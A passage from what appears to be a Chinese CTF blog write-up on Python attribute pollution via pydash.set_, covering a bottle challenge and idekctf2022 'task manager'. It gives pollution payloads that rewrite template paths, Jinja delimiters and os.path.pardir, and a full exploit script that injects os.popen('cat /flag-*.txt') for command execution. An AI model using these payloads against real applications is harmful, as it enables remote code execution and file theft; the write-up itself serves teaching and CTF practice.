class="built_in">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;7&quot;</span></span><br><span class="line"></span><br><span class="line">@bottle.get(<span class="string">&#x27;/render&#x27;</span>)</span><br><span class="line">def render_template():</span><br><span class="line">    <span class="built_in">print</span>(pydash.name);</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="comment">#path是文件名</span></span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=0 or path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=0 or path.find(<span class="string">&quot;.&quot;</span>)&gt;=0:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="built_in">return</span> bottle.template(path)</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;setValue是原型链污染，&#x2F;render是渲染结果输出</p>
+<p>由报错知，path是文件名（ template（）-&gt; search（））</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    第一个参数可以是模板名称、文件名或模板字符串，</span></span><br><span class="line"><span class="string">    后面的参数可以是字典或关键字参数，</span></span><br><span class="line"><span class="string">    用于模板渲染时的变量替换。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tpl = args[<span class="number">0</span>] <span class="keyword">if</span> args <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args[<span class="number">1</span>:]:</span><br><span class="line">    <span class="comment">#从args第二个参数开始遍历</span></span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">        <span class="comment">#将 dictarg 的键值对合并到 kwargs 中</span></span><br><span class="line">    adapter = kwargs.pop(<span class="string">&#x27;template_adapter&#x27;</span>, SimpleTemplate)</span><br><span class="line">    <span class="comment">#选择模板引擎</span></span><br><span class="line">    lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br><span class="line">    <span class="comment">#设定文件目录</span></span><br><span class="line">    tplid = (<span class="built_in">id</span>(lookup), tpl)</span><br><span class="line">    <span class="comment">#缓存键</span></span><br><span class="line">    <span class="keyword">if</span> tplid <span class="keyword">not</span> <span class="keyword">in</span> TEMPLATES <span class="keyword">or</span> DEBUG:</span><br><span class="line">        settings = kwargs.pop(<span class="string">&#x27;template_settings&#x27;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            <span class="keyword">if</span> settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">            <span class="comment">#若 tpl 是 adapter 的实例，直接缓存并调用 prepare（配置预处理）</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;%&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&#x27;$&#x27;</span> <span class="keyword">in</span> tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">            <span class="comment">#若 tpl 包含换行符或特定符号（&#123;, %, $），视为模板字符串，通过 source 参数加载</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">            <span class="comment">#否则，视为模板名称或文件路径，通过 name 参数加载</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> TEMPLATES[tplid]:</span><br><span class="line">        abort(<span class="number">500</span>, <span class="string">&#x27;Template (%s) not found&#x27;</span> % tpl)</span><br><span class="line">        <span class="comment">#若模板加载失败（如文件不存在），调用 abort 终止并返回 HTTP 500 错误</span></span><br><span class="line">    <span class="keyword">return</span> TEMPLATES[tplid].render(kwargs)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#因为path禁用了&#123;&#125;，所以会被当成文件名在模板目录里查找使用 → 继续追踪到search函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">cls, name, lookup=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Search name in all directories specified in lookup.</span></span><br><span class="line"><span class="string">    First without, then with common extensions. Return first hit. &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lookup:</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&quot;Empty template lookup path.&quot;</span>, <span class="string">&quot;Configure a template lookup path.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.isabs(name):</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&quot;Use of absolute path for template name.&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Refer to templates with names or paths relative to the lookup path.&quot;</span>)</span><br><span class="line"><span class="comment">#传入的是绝对路径</span></span><br><span class="line">    <span class="keyword">for</span> spath <span class="keyword">in</span> lookup:</span><br><span class="line">        spath = os.path.abspath(spath) + os.sep</span><br><span class="line">        <span class="comment"># 将搜索路径转换为绝对路径，并确保以分隔符结尾（如 &quot;/safe/dir/&quot; → &quot;/safe/dir/&quot;)</span></span><br><span class="line">        </span><br><span class="line">        fname = os.path.abspath(os.path.join(spath, name))</span><br><span class="line">        <span class="comment"># 拼接目标文件的绝对路径（如 &quot;/safe/dir/&quot; + &quot;index.html&quot; → &quot;/safe/dir/index.html&quot;）</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fname.startswith(spath): <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 关键安全校验：确保生成的路径仍在搜索路径内（防止路径穿越）</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(fname): <span class="keyword">return</span> fname</span><br><span class="line">        <span class="comment">#检测原始文件是否存在</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> ext <span class="keyword">in</span> cls.extensions:</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;%s.%s&#x27;</span> % (fname, ext)):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s.%s&#x27;</span> % (fname, ext)</span><br><span class="line">        <span class="comment"># 若原始文件不存在，尝试附加扩展名（如 &quot;index&quot; → &quot;index.html&quot;）</span></span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计，想到可以利用此处来读文件，但是不能直接利用目录穿越漏洞，得修改TEMPLATE_PATH，这就得利用到setval(name, path, value)了</p>
+<p>即setval(bottle,TEMPLATE_PATH,”..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;“)</p>
+<p>然后查看pydash.set_(obj,path,value)源码,一路追踪到helpers.base_set</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base_set</span>(<span class="params">obj, key, value, allow_override=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Set an object&#x27;s `key` to `value`. If `obj` is a ``list`` and the `key` is the next available</span></span><br><span class="line"><span class="string">    index position, append to list; otherwise, pad the list of ``None`` and then append to the list.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj: Object to assign value to.</span></span><br><span class="line"><span class="string">        key: Key or index to assign to.</span></span><br><span class="line"><span class="string">        value: Value to assign.</span></span><br><span class="line"><span class="string">        allow_override: Whether to allow overriding a previously set key.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="keyword">if</span> allow_override <span class="keyword">or</span> key <span class="keyword">not</span> <span class="keyword">in</span> obj:</span><br><span class="line">            obj[key] = value</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>):</span><br><span class="line">        key = <span class="built_in">int</span>(key)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key &lt; <span class="built_in">len</span>(obj):</span><br><span class="line">            <span class="keyword">if</span> allow_override:</span><br><span class="line">                obj[key] = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key &gt; <span class="built_in">len</span>(obj):</span><br><span class="line">                <span class="comment"># Pad list object with None values up to the index key, so we can append the value</span></span><br><span class="line">                <span class="comment"># into the key index.</span></span><br><span class="line">                obj[:] = (obj + [<span class="literal">None</span>] * key)[:key]</span><br><span class="line">            obj.append(value)</span><br><span class="line">    <span class="keyword">elif</span> (allow_override <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(obj, key)) <span class="keyword">and</span> obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        _raise_if_restricted_key(key)</span><br><span class="line">        <span class="built_in">setattr</span>(obj, key, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="comment"># Prevent access to restricted keys for security reasons.</span></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    RESTRICTED_KEYS = (<span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可见pydash.set_对于可覆盖的值有限制,限制表为RESTRICTED_KEYS &#x3D; (“<strong>globals</strong>“, “<strong>builtins</strong>“)</p>
+<p>所以我们现在要先修改RESTRICTED_KEYS,即</p>
+<p>&#x2F;setValue?name&#x3D;pydash</p>
+<p>{“path”:”helpers.RESTRICTED_KEYS”,”value”:[]}(空数组)</p>
+<p>pydash.set_(pydash,helpers.RESTRICTED_KEYS,[])</p>
+<p>(包目录下的 <code>.py</code> 文件会被视为子模块,即使__init__包里不存在引入helpers也能使用)</p>
+<p>然后要通过__globals__来访问bottle模块,但是pydash模块没有__globals__,</p>
+<p>在代码**末尾(!!!!!!!!!!!!!!!!!!!!!!)**添加print(globals().keys()),可得所有全局变量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict_keys([<span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;Optional&#x27;</span>, <span class="string">&#x27;pydash&#x27;</span>, <span class="string">&#x27;bottle&#x27;</span>, <span class="string">&#x27;__forbidden_path__&#x27;</span>, <span class="string">&#x27;__forbidden_name__&#x27;</span>, <span class="string">&#x27;setval&#x27;</span>, <span class="string">&#x27;set_value&#x27;</span>, <span class="string">&#x27;render_template&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>发现可以利用setval函数,于是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/setValue?name=setval</span><br><span class="line"></span><br><span class="line">&#123;&quot;path&quot;:&quot;__globals__.bottle.TEMPLATE_PATH&quot;,&quot;value&quot;:[&quot;../../../proc/self/&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就可以成功更改目录,然后再&#x2F;render传参即可</p>
+<h3 id="idekctf2022-task-manager"><a href="#idekctf2022-task-manager" class="headerlink" title="[idekctf2022]task manager"></a>[idekctf2022]task manager</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">if</span> app.env == <span class="string">&#x27;yolo&#x27;</span>:</span><br><span class="line">        app.add_template_global(<span class="built_in">eval</span>)</span><br><span class="line"><span class="comment">#将 Python 函数注入到 Jinja2 模板环境，使该函数能在所有模板中直接调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#taskmanager.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaskManager</span>:</span><br><span class="line">    protected = [<span class="string">&quot;set&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;get_all&quot;</span>, <span class="string">&quot;__init__&quot;</span>, <span class="string">&quot;complete&quot;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">self, task, status</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.protected)</span><br><span class="line">        <span class="keyword">if</span> task <span class="keyword">in</span> <span class="variable language_">self</span>.protected:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        pydash.set_(<span class="variable language_">self</span>, task, status)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment">#可以进行原型链污染</span></span><br></pre></td></tr></table></figure>
+
+<p>此处可以通过原型链污染将eval添加到jinja2模板环境中,payload如下:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;protected&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;[]&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__.__globals__.__spec__.__init__.__globals__.sys.modules.__main__.app.env&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;yolo&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.before_first_request&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;false&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">//让before_first_request并非执行一次,而是一直执行,设置为false就可以让eval一直呆在添加到jinja2模板环境中</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就要查找能利用eval的地方,现有模板文件是利用不上了,查找eval引用时,发现</p>
+<p><img src="/../images/image-20250331223408817.png" alt="image-20250331223408817"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> value <span class="keyword">in</span> [<span class="string">&quot;True&quot;</span>, <span class="string">&quot;False&quot;</span>, <span class="string">&quot;None&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&quot;&#x27;</span>]:</span><br><span class="line">    value = <span class="built_in">eval</span>(value)</span><br><span class="line"><span class="keyword">else</span>:</span><br></pre></td></tr></table></figure>
+
+<p>可以想办法让模板渲染此文件,并且把eval包含执行</p>
+<p>通过修改闭合字符串可以做到</p>
+<blockquote>
+<p>block_start_string标记块开始的字符串。默认为<code>&#123;%`.
+>
+> block_end_string标记块结束的字符串。默认为`%&#125;</code>.</p>
+<p>variable_start_string标记打印语句开始的字符串。默认为<code>&#123;&#123;`.
+>
+> variable_end_string标记打印语句结束的字符串。默认为 `&#125;&#125;</code>.</p>
+</blockquote>
+<p>因此payload如下:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\n value = &quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\n else:&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后绕过jinja的目录穿越实现任意文件渲染</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py可以渲染url传入的路径名,但是只能在templates中搜索</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_template_path</span>(<span class="params">template: <span class="built_in">str</span></span>) -&gt; t.<span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Split a path into segments and perform a sanity check.  If it detects</span></span><br><span class="line"><span class="string">    &#x27;..&#x27; in the path it will raise a `TemplateNotFound` error.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pieces = []</span><br><span class="line">    <span class="keyword">for</span> piece <span class="keyword">in</span> template.split(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            os.sep <span class="keyword">in</span> piece</span><br><span class="line">            <span class="keyword">or</span> (os.path.altsep <span class="keyword">and</span> os.path.altsep <span class="keyword">in</span> piece)</span><br><span class="line">            <span class="keyword">or</span> piece == os.path.pardir</span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">raise</span> TemplateNotFound(template)</span><br><span class="line">        <span class="keyword">elif</span> piece <span class="keyword">and</span> piece != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">            pieces.append(piece)</span><br><span class="line">    <span class="keyword">return</span> pieces</span><br></pre></td></tr></table></figure>
+
+<p>可以看到jinja2通过 <code>os.path.pardir</code> 来对目录穿越进行了保护，我们可以通过修改 <code>pardir</code> 的值来绕过,payload如下:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.pardir&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>最终exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://127.0.0.1:1337&#x27;</span></span><br><span class="line">url      = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/api/manage_tasks&#x27;</span></span><br><span class="line">exp_url  = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/../../usr/local/lib/python3.8/turtle.py&#x27;</span></span><br><span class="line">app      = <span class="string">&#x27;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add eval to template globals</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>.env&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;yolo&quot;</span>&#125;)</span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>._got_first_request&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass jinja directory traversal check</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;foobar&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change jinja_env</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>.jinja_env.variable_start_string&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;&quot;&quot;&#x27;&quot;&quot;&#x27;]:\n            value = &quot;&quot;&quot;</span>&#125;)</span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>.jinja_env.variable_end_string&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;\n&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add global vars</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>.jinja_env.globals.value&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag-*.txt&#x27;).read()&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=exp_url)</span><br><span class="line">p = r.prepare()</span><br><span class="line">p.url = exp_url</span><br><span class="line">r = s.send(p)</span><br><span class="line">flag = re.findall(<span class="string">&#x27;idek&#123;.*&#125;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考:<a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/#toc__9">https://tttang.com/archive/1876/#toc__9</a></p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">夏饭orz</a>
+            <p>原文链接：<a href="http://example.com/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">http://example.com/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a>
+            <p>发表日期：<a href="http://example.com/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">June 22nd 2025, 2:30:00 pm</a>
+            <p>更新日期：<a href="http://example.com/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">June 22nd 2025, 11:13:56 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/06/22/xpath%E6%B3%A8%E5%85%A5/" title="Xpath注入">
+                    <div class="nextTitle">Xpath注入</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/06/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="流量分析">
+                    <div class="prevTitle">流量分析</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
